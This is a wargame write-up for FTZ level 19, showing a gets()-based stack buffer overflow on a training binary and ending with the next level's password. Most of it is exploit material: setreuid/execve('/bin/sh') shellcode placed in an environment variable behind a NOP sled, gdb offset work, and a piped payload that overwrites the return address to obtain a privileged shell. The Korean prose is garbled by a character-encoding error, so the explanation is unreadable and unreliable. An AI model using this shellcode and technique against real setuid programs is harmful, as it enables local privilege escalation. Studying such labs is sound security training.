I"Â<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>login as: level19
level19@~~~~<span class="s1">'s password:
[level19@ftz level19]$ cat hint


main()
{ char buf[20];
  gets(buf);
  printf("%s\n",buf);
}

[level19@ftz level19]$

</span></code></pre></div></div>
<p>level9/swimming in pinkë¡œ ì ‘ì†í•˜ì. í”„ë¡œê·¸ë¨ ì†ŒìŠ¤ëŠ” êµ‰ì¥íˆ ì‹¬í”Œí•˜ë‹¤.</p>

<p>ì´ì „ê¹Œì§€ì˜ ë²„í¼ì˜¤ë²„í”Œë¡œìš° ë¬¸ì œë“¤ì€ setreuid í•¨ìˆ˜ê°€ ìˆì—ˆì§€ë§Œ, ì´ë²ˆì—ëŠ” ì—†ë‹¤.</p>

<p>ê·¸ëŸ¬ë¯€ë¡œ ì‰˜ ì½”ë“œì— setreuidì™€ bashí•¨ìˆ˜ê°€ ë‹¤ í¬í•¨ë˜ì–´ ìˆì–´ì•¼ í•œë‹¤.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level19@ftz level19]<span class="nv">$ </span><span class="nb">export </span><span class="nv">code</span><span class="o">=</span><span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*100+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'</span><span class="si">)</span>
</code></pre></div></div>
<p>ì´ì œ gdbë¡œ bufì˜ í¬ê¸°ë¥¼ í™•ì¸í•˜ì.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level19@ftz level19]<span class="nv">$ </span>gdb <span class="nt">-q</span> attackme
<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set </span>disas intel
<span class="o">(</span>gdb<span class="o">)</span> disas main
Dump of assembler code <span class="k">for function </span>main:
0x08048440 &lt;main+0&gt;:    push   ebp
0x08048441 &lt;main+1&gt;:    mov    ebp,esp
0x08048443 &lt;main+3&gt;:    sub    esp,0x28
0x08048446 &lt;main+6&gt;:    sub    esp,0xc
0x08048449 &lt;main+9&gt;:    lea    eax,[ebp-40]
0x0804844c &lt;main+12&gt;:   push   eax
0x0804844d &lt;main+13&gt;:   call   0x80482f4 &lt;gets&gt;
0x08048452 &lt;main+18&gt;:   add    esp,0x10
0x08048455 &lt;main+21&gt;:   sub    esp,0x8
0x08048458 &lt;main+24&gt;:   lea    eax,[ebp-40]
0x0804845b &lt;main+27&gt;:   push   eax
0x0804845c &lt;main+28&gt;:   push   0x80484d8
0x08048461 &lt;main+33&gt;:   call   0x8048324 &lt;<span class="nb">printf</span><span class="o">&gt;</span>
0x08048466 &lt;main+38&gt;:   add    esp,0x10
0x08048469 &lt;main+41&gt;:   leave
0x0804846a &lt;main+42&gt;:   ret
</code></pre></div></div>
<p>main+9ì—ì„œ bufë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ë³´ì¸ë‹¤.</p>

<p>bufì˜ í¬ê¸°:ebp-40</p>

<p>buf(40)+SFP(4)=44ì´ë¯€ë¡œ 44ê°œì˜ ê°’ë“¤ì„ ì±„ìš°ë©´ RETì— ì ‘ê·¼í•  ìˆ˜ ìˆë‹¤.</p>

<p>í™˜ê²½ë³€ìˆ˜ì˜ ì£¼ì†Œê°’ì„ ì°¾ì•„ë³´ì.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level19@ftz tmp]<span class="nv">$ </span><span class="nb">cd</span> /tmp
<span class="o">[</span>level19@ftz tmp]<span class="nv">$ </span><span class="nb">cat </span>find.c
<span class="c">#include&lt;stdio.h&gt;</span>
int main<span class="o">()</span>
<span class="o">{</span>
        <span class="nb">printf</span><span class="o">(</span><span class="s2">"%x</span><span class="se">\n</span><span class="s2">"</span>,getenv<span class="o">(</span><span class="s2">"code"</span><span class="o">))</span><span class="p">;</span>
<span class="o">}</span>
<span class="o">[</span>level19@ftz tmp]<span class="nv">$ </span>./find
bfffff1b
<span class="o">[</span>level19@ftz tmp]<span class="err">$</span>
</code></pre></div></div>
<p>í™˜ê²½ë³€ìˆ˜ì˜ ì£¼ì†Œê°’:bfffff1b</p>

<p>ì´ì œ ì½”ë“œë¥¼ ì‘ì„±í•´ë³´ì.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level19@ftz level19]<span class="nv">$ </span><span class="o">(</span>python <span class="nt">-c</span> <span class="s1">'print"\x90"*44+"\x1b\xff\xff\xbf"'</span><span class="p">;</span><span class="nb">cat</span><span class="o">)</span>|./attackme
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAï£·ï£·?
my-pass
TERM environment variable not set.

Level20 Password is <span class="s2">"we are just regular guys"</span><span class="nb">.</span>
</code></pre></div></div>
<p>level20â€™s password:â€we are just regular guysâ€</p>
:ET